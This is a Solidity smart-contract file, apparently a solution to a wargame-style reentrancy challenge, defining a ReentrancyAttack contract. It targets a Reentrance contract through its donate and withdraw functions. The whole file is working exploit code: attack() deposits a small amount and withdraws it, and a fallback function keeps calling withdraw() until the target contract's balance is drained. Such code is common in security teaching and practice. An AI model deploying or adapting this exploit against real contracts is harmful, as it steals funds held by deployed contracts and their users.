// SPDX-License-Identifier: MIT
pragma solidity ^0.6.4;

import './Reentrancy.sol';

contract ReentrancyAttack {
    Reentrance public reentrancyContract;
    uint public amount = 0.001 ether;
    
    constructor(address payable _addr) public payable {
        reentrancyContract = Reentrance(_addr);
    }
    // Fallback is called when reentrancyContract sends Ether to this contract.
    fallback() external payable {
        if (address(reentrancyContract).balance >= amount) {
            reentrancyContract.withdraw(amount);
        }
    }

    function attack() external payable {
        require(msg.value >= 0.001 ether);
        reentrancyContract.donate{value: amount}(address(this));
        reentrancyContract.withdraw(amount);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}